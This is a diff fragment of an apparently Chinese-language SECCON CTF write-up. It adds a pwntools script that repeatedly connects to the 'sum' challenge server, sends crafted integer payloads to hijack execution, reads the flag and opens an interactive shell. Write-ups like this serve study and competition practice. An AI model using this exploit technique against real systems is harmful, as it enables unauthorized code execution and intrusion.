@@ -522,6 +522,37 @@ SECCON{Keep_Going!_KEEP_GOING!_K33P_G01NG!}
 
 Rwind给出一种爆破的方法，由running跑出
 
+```python
+from pwn import *
+import os
+
+i = 0
+while True:
+    try:
+        
+        p = remote("sum.chal.seccon.jp", 10001)
+        p.recvuntil("[Example]\n")
+        p.recvline()
+        payload = '1 -2099676 1 1 1 6295624'
+
+        p.sendline(payload)
+        p.recvuntil("[Example]\n")
+        p.recvline()
+        payload2 = "-6295571 1 1 -2 -17031615434157195264 6295571"
+        # raw_input()
+        p.sendline(payload2)
+
+        sleep(0.1)
+        p.sendline("cat flag")
+        a = p.recvline()
+        log.info(a)
+        if 'flag' in a:
+        	p.interactive()
+
+    except:
+        p.close()
+```
+
 running tql
 
 在ctftime看了一波wp后学了一种巧妙的方法
